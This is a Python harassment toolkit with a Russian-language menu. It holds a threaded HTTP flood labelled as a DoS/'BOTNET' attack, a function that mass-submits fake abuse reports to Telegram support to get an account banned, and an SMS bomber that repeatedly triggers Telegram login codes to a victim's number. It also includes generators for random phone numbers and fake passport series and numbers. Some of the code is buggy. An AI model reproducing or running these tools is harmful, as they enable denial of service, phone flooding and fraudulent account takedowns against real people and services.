import time
import requests
import random
import socket
import telebot
import colorama
from colorama import Fore, Back, Style
import os
from art import tprint
from threading import Thread

headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.3'}
colorama.init()
print (Fore.RED + "")



tprint ("EXIT")

print("------------")

print (Fore.BLUE + "")
time.sleep(1)


    

                

def gen():
    kol = input("Количество номеров:")
    time.sleep(1)
    print ("Номера...")
    for h in range(int(kol)):
        phone = random.randint(79000000000, 79999999999)
        print (phone)
    time.sleep(215)
    

def gp():
    kol = input("Количество:")
    time.sleep(1)
    print ("Generate...")
    for p in range(int(kol)):
        gen = random.randint(2222, 9999)
        gen1 = random.randint(111111, 999999)
        print (gen, gen1)
    time.sleep(215)
    

def snos():
    url = "https://telegram.org/support"
    text = "Накручивает подписчиков. Line:"
    print ("URL")
    name = input(">")
    kl = input("Потоки:")
    ml = "@gmail.com"
    ban = (text, name)
    time.sleep(1)
    for i in range(int(kl)):
        num = random.randint(79111111111, 79999999999)
        mail = random.randint(1111111111, 99999999999)
        ms = (str(mail) + ml)
        res = requests.post(url, data={'message': ban} and {'email': ms} and {'phone': num}, headers=headers)
        print ("СНОС ТГ...", res.status_code)
                

            
                
def sms():
    tgs = "https://my.telegram.org/auth/send_password"
    ph = input("Номер:")
    pv = input("Кол-во sms:")
    for k in range(int(pv)):
        res = requests.post(tgs, data={'phone': ph}, headers=headers)
        print ("Cообщение отправлено!", res.status_code)
        time.sleep(0.75)
    
    


print ("_____________________________________________")
print ("|  1. DOS АТАКА                                             ")
print ("|  2. Генератор Номеров                               ")
print ("|  3. Общение с users через бота тг             ")
print ("|  4. Генератор Серии/ Номера паспорта   ")
print ("|  5. Сносер                                                      ")
print ("|  6. Смс  telegramm")
print ("|  0. Выход                                                      ")
print ("---------------------------------------------")

print ("")
user = input("Введите номер действия>")

if user == "5":
    snos()



if user == "4":
    gp()

if user == "2":
    gen()

if user == "0":
    exit()

if user == "6":
    sms()

if user == "3":
    token = input("Токен бота:")
    bot = telebot.TeleBot(token)
    @bot.message_handler(commands=["start"])
    def start(m, res=False):
        bot.send_message(m.chat.id, 'Я на связи. Напиши мне что-нибудь )')
        while True:
            @bot.message_handler(content_types=["text"])
            def handle_text(message):
                print ("Noname:", message.text)
                n = input("Вы:")
                bot.send_message(m.chat.id, n)
    bot.polling(none_stop=True, interval=0)

if user == "1":
    url = input("url:")
    th = input("Количество BOTNET:")
    print ("Атака запущена...")
    
    def ddos():
        while(1<10):
            spam1 = requests.get(url, headers=headers)
            spam2 = requests.get(url, headers=headers)
            time.sleep(1)
            print ("DOS...")
        
        
    for i in range(int(th)):
        thr = Thread(target = ddos)
        thr.start()
    
    
    
      
    
    










    
